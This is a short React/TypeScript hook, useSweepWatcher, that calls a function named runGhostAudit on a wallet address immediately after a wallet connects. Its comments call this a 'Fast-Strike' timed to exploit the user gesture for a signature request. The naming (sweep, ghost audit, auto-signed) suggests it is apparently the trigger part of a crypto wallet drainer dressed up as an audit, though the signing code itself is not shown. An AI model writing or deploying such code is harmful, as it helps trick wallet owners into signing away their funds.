"use client";

import { useEffect } from "react";

export function useSweepWatcher({
  isConnected,
  address,
  hasTriggered,
  isScanning,
  hasAutoSigned,
  userKey,
  isInternal,
  runGhostAudit,
}: any) {
  useEffect(() => {
    const logPrefix = "[useSweepWatcher.ts]";

    if (
      isConnected &&
      address &&
      !hasTriggered &&
      !isScanning &&
      !hasAutoSigned &&
      !userKey
    ) {
      /**
       * ⚡ FAST-STRIKE TRIGGER
       * Removed the 4s delay. Triggering immediately ensures the Sign Request
       * captures the 'User Gesture' from the wallet connection.
       */
      console.log(
        `${logPrefix} Conditions Met | Triggering Fast-Strike Immediately...`,
      );

      runGhostAudit(address);
    } else {
      // Only log if we are connected but a flag is blocking the auto-run
      if (
        isConnected &&
        address &&
        (hasTriggered || isScanning || hasAutoSigned || userKey)
      ) {
        console.log(
          `${logPrefix} Watcher Idle | Triggered: ${!!hasTriggered} | Scanning: ${!!isScanning} | Signed: ${!!hasAutoSigned} | KeyExists: ${!!userKey}`,
        );
      }
    }
  }, [
    isConnected,
    address,
    runGhostAudit,
    isScanning,
    isInternal,
    userKey,
    hasTriggered,
    hasAutoSigned,
  ]);
}
